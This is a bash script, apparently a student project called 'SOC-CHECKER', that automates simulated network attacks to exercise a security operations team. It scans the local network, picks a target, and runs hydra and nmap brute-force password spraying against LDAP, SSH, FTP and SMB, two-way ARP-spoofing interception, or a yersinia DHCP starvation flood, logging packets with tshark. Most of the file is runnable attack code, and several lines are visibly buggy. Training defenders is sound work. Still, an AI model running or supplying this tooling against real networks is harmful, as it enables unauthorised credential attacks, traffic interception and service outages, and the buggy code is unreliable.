#!/bin/bash

#student name: daniel ben-yehuda
#student code: S7
#class code: 773626
#lecturer name: erel


#global
tmp="$(pwd)/tmp"
log_dir="/var/log/SOCheck"
log="$log_dir/Attack-log-$(date | sed 's/\s/-/g')".txt
SOCtmp="$tmp/$(date | sed 's/\s/-/g').tmp"
SOCtmp2="$tmp/$(date | sed 's/\s/-/g')2.tmp"
default_gateway=$(route -n | awk 'NR==3 {print $2}') #default gateway
CIDR_calc=$(ifconfig  | grep "BROADCAST" -A 1 | awk -F"netmask" '{print $2}' | awk '{print $1}') | grep "Network" | awk '{print $2}'
net_range=$(ipcalc $(hostname -I) $CIDR_calc | grep "Network" | awk '{print $2}')
wordlist=$(pwd)/crunch.txt

#color code
red='\e[0;31m'
grn='\e[0;32m'
norm='\e[0;0m'
yel='\e[0;33m'
cyan='\e[0;36m'


function Banner () {
    echo -e "${grn}"
    figlet "Project: SOC-CHECKER"
    echo -e "A vulnerability scan tool by Daniel ben-yehuda ${norm}"
    date
    sleep 2
}
Banner


function dependency () { #ipcalc for automaticly determin the netrange, gnome terminal for paralel executions.
echo -e "${yel}[-]verifying dependency 'ipcalc'[-]${norm}"
    if command -v ipcalc &> /dev/null
    then
        echo -e "${grn}ipcalc check!${norm}"
    else
        echo "ipcalc does not exist\n${yel}[-]Installing dependency 'ipcalc'[-]"
        apt-get install ipcalc -y
    fi
    
echo -e "${yel}[-]verifying dependency gnome-terminal${norm}"
    if command -v gnome-terminal -- bash -c "echo -e '${grn}gnome-terminal verification test - ${red}KILL IT'; exec bash"
    then
        gnome-terminal -- bash -c "echo -e '${grn}gnome-terminal verification test - ${red}it will die in 3 seconds'; sleep 3"
    else
        echo "gnome-terminal does not exist\n${yel}[-]Installing dependency 'gnome-terminal[-]"
        apt-get install gnome-terminal -y
    fi
}
dependency

function usercheck () { #some of the actions and locations may require elevated permisions
    echo -e "${grn} Verifying Super-user... ${norm}" 
        if [ "$(whoami)" != "root" ]; then
            echo -e "${red}This script requires superuser privileges. Please run with sudo.${norm}"
            exit 1
        else
	        echo -e "${grn} Super-user confirmed, loading script.... ${norm}\n--------------------------------------------------------------"
        fi
}
usercheck

function info () { #basic info of the scripts purpuse
    echo -e "[-]Project SOC-Checker is an educational initiative designed to create contained and simulated network attacks to stimulate the SOC team, validate defensive measures, and reinforce the team's muscle memory.

[-]The script offers users the choice of executing three different attacks or running a random attack in a "Fire-And-Forget" manner, requiring minimal familiarity with the attack tool itself. Additionally, the script maintains a log of the actions performed, as well as a timestamp of the team's response to impede the attack.

[-]The script does not make any changes to any machine on the network nor does it collect any internal data.\n"
read -p "::Press any key to continue..."
}
info

function directory_check () { #check if the log directory and temp files directory exist, if not make them.
    if [ -d /var/log/SOCheck ]; then
        echo -e "${cyan}/var/log/SOCheck exists!${norm}"
    else
        mkdir -p /var/log/SOCheck
        echo -e "${grn} /var/log/SOCheck created. ${norm}"
    fi

        if [ -d $(pwd)/tmp ]; then
        echo -e "${cyan} $(pwd)/tmp exists!${norm}"
    else
        mkdir -p $(pwd)/tmp
        echo -e "${grn} $tmp created. ${norm}"
    fi
}
directory_check

network_scan () { #determine how manyhosts are on the network
   
    date >> "$log"
    ifconfig >> "$log"
    echo -e "${yel}[-] Scanning for targets in $net_range [-]${norm}"
    nmap "$net_range" -F -Pn | grep "scan report" | awk '{print $NF}' | sed 's/[()]//g' > "$SOCtmp"
    
   # set host as target by selecting it's index number and modifying it to variable.
    echo -e "--------------------------------------------------------------\nINDEX  | IP ->\n--------------------------------------------------------------" >> "$log"
    cat "$SOCtmp" >> "$log"
    echo -e "--------------------------------------------------------------\nINDEX  | IP ->\n--------------------------------------------------------------"
    cat -n "$SOCtmp"
    read -p "Select target by index number or press [R] for random :: " target

    #if capital 'R' selected use the total amount of lines in the tmp file that contains only hosts as a modifier for the "shuf" command in order to accuratly randomize the target, and modify the target variable with that index number to be the target.
    if [ "$target" == 'R' ]; then
        total_lines=$(wc -l < "$SOCtmp")
        shuffle=$(shuf -i 1-"$total_lines" -n 1)
        target=$(awk "NR==$shuffle" "$SOCtmp")
    else
        target=$(awk "NR==$target" "$SOCtmp")
    fi

    echo "Target selected -> $target"
}

network_scan


function method () { #select attack mode, pass-spray with admin as user and just random numbers as passwords, MiTM between the target and the default gateway, DHCP starvation (use with care!), option 4 to randomize the type of attack much like the target select randomizer.
    echo -e "\n${yel}[+]Please choose simulated attack method[+]${norm}\n--------------------------------------------------------------\n\n[1] Password Spray - attack hosts with common administrative usernames and random passwords.\n\n[2] MiTM - listen to the conversation between the targets and the Domain Controller.\n\n[3] DHCP Starvation - flood the DHCP server with DISCOVER requests to starve the IP pool.\n${red} WORNING ! DO NOT USE ON CRUCIAL SYSTEMS OR CLIENT FACING SYSTEMS !${norm}\n\n[4] select random attack"

    read -p ":: " attack

    if [ $attack == 1 ]; then
    echo -e "------------------------\n ATTACK MODE SELECTED :: PASSWORD SPRAY\n------------------------n\ $target" >> $log

    fi 
    if [ $attack == 2 ]; then
    echo -e "------------------------\n ATTACK MODE SELECTED :: MiTM\n------------------------\n $target" >> $log
    fi 
    if [ $attack == 3 ]; then
    echo -e "------------------------\n ATTACK MODE SELECTED :: DHCP STARVATION\n------------------------\n $target" >> $log
    fi
    if [ $attack  == 4 ]; then
    attack=$(shuf -i 1-3 -n 1)


    fi
}
method



function spray (){ #scan target sequentialy for any one of the services and set the first one it finds as target
echo -e "${yel}[!] PASSWORD SPRAY ATTACK MODE SELECTED [!]"


        echo -e "${yel}[!] Scanning for relevant services -> ${norm}"
        echo "$target" 
        nmap $target -Pn -T5 | grep -e "fdp" -e "ssh" -e "ldap" -e "microsoft-ds" -e "netbios-ssn" >> $SOCtmp2
        cat $SOCtmp2 | grep -e "fdp" -e "ssh" -e "ldap" -e "microsoft-ds" -e "netbios-ssn"


    if cat "$SOCtmp2" | grep -q "ldap"; then
        echo "targeting LDAP service at port $port" >> $log
        port=$(grep "ldap" $SOCtmp2 | head -1 | awk -F'/' '{print $1}')
        gnome-terminal -- bash -c "hydra -l abministrat0r -P $wordlist ldap3://$target:$port; exec bash"

    elif cat "$SOCtmp2" | grep -q "ssh"; then
        echo "targeting SSH service at port $port" >> $log
        port=$(grep "ssh" $SOCtmp2 | head -1 | awk -F'/' '{print $1}')
        gnome-terminal -- bash -c "nmap --script ssh-brute --script-args userdb=$wordlist,passdb=$wordlist $target; exec bash"

    elif cat "$SOCtmp" | grep -q "ftp"; then
        echo "targeting FTP service at port $port" >> $log
        port=$(grep "ftp" $SOCtmp2 | head -1 | awk -F'/' '{print $1}')
        gnome-terminal -- bash -c "nmap --script ftp-brute --script-args userdb=$wordlist,passdb=$wordlist $target; exec bash"

    elif cat "$SOCtmp2" | grep -q "microsoft-ds"; then
        echo "targeting microsoft-ds service at port $port" >> $log
        port=$(grep -e "microsoft-ds" $SOCtmp2 | head -1 | awk -F'/' '{print $1}')
        gnome-terminal -- bash -c "hydra -l abministrat0r -P $wordlist smb://$target:$port; exec bash"

    elif cat "$SOCtmp2" | grep -q "netbios-ssn"; then
        echo "targeting netbios-ssn service at port $port" >> $log
        port=$(grep -e "netbios-ssn" $SOCtmp2 | head -1 | awk -F'/' '{print $1}')
        gnome-terminal -- bash -c "hydra -l abministrat0r -P $wordlist smb://$target:$port; exec bash"
    fi

    echo "setting up SOC awarness detection system"
     ttamp=$(pwd)/tmp/ttamp.txt
    gnome-terminal -- bash -c "sudo tshark -i eth0 -Y 'ldap || rdp || ssh || netbios'>> $ttamp; exec bash" #set gnome terminal with Tshark to determine the amount of packets and attack duration to evaluate SOC team response time.

   
while true; do
    if route -n | grep -q '[0123456789]'; then #sample the conncetion to the network evry 5 seconds to determine if the attack is descoverd and the attack machine was booted off the network. if so kill the gnome processes.
        echo "target undergoing attack!"
    else
        echo -e "${grn}attack has been discovered and dealt with in ! You are disconnected from the network"
        pkill gnome-terminal
        
        break
    fi
 
    sleep 5
done
       echo "$(cat $ttamp | wc -l) attack related packets transmitted over the span of $(cat $ttamp | tail -1 | awk '{print $2}' | awk -F'.' '{print $1}') seconds." >> $log
}


function MiTM (){ #set up 2 gnome-terminals to listen between the target and the default gateway, generating noise with arp spoof packets
echo -e "------------------------\n ATTACK MODE SELECTED :: MiTM\n------------------------" >> $log
echo -e "${yel}[!] MiTM ATTACK MODE SELECTED [!]"

    echo "setting up SOC awarness detection system"
    gnome-terminal -- bash -c "arpspoof -i eth0 -t $target $default_gateway ; exec bash"
    sleep 2
    gnome-terminal -- bash -c "arpspoof -i eth0 -t $default_gateway $target  ; exec bash"

    ttamp=$(pwd)/ttamp.txt
    gnome-terminal -- bash -c "sudo tshark -i eth0 -Y arp | grep "duplicate use" >> $ttamp; exec bash"
   
while true; do #same method as before.
    if route -n | grep -q '[0123456789]'; then
        echo "target undergoing attack!"
    else
        echo -e "${grn}attack has been discovered and dealt with in ! You are disconnected from the network"
        pkill gnome-terminal
        
        break
    fi
 
    sleep 5
done
    echo "$(cat $ttamp | wc -l) attack related packets transmitted over the span of $(cat $ttamp | tail -1 | awk '{print $2}' | awk -F'.' '{print $1}') seconds." >> $log
}


function DHCP_EXHAUSTION (){ # utilizing yersinia to attack the target with a flood discovery packets preventing other hosts recieving an adress from the DHCP, think wisely on which target you are using this and when!
echo -e "------------------------\n ATTACK MODE SELECTED :: DHCP STARVATION\n------------------------" >> $log
echo -e "${yel}[!] DHCP STARVATION ATTACK MODE SELECTED [!]"

    echo "setting up SOC awarness detection system"
    ttamp=$(pwd)/ttamp.txt
    gnome-terminal -- bash -c "sudo tshark -i eth0 -Y dhcp  >> $ttamp; exec bash"
    sleep 3 #tshark take a couple of seconds to start listening while yersinia starts right away. this is for more accurate measure.

    gnome-terminal -- bash -c "yersinia dhcp -attack 1 ; exec bash"
    sleep 2

 while true; do #same method
    if route -n | grep -q '[0123456789]'; then
        echo "target undergoing attack!"
    else
        echo -e "${grn}attack has been discovered and dealt with in ! You are disconnected from the network"
        pkill gnome-terminal
        break
    fi
    
    sleep 5
done
    echo "$(cat $ttamp | wc -l) attack related packets transmitted over the span of $(cat $ttamp | tail -1 | awk '{print $2}' | awk -F'.' '{print $1}') seconds." >> $log

}

function cleanup (){ #delete tmp files and yersinia log
    echo -e "${grn} cleaning up!${norm}"
    rm $tmp/*
    if [ $attack == 3 ]; then
    rm ./yersinia.log
    fi
    echo "job done! attack log at $log_dir"


}

function attack () { #the compiled options case for full and basic
    case $attack in

    1)
        spray
        cleanup


    ;;

    2)
        MiTM
        cleanup

    ;;

    3)
        DHCP_EXHAUSTION
        cleanup

    ;;

    *)

    ;;

    esac
}
attack
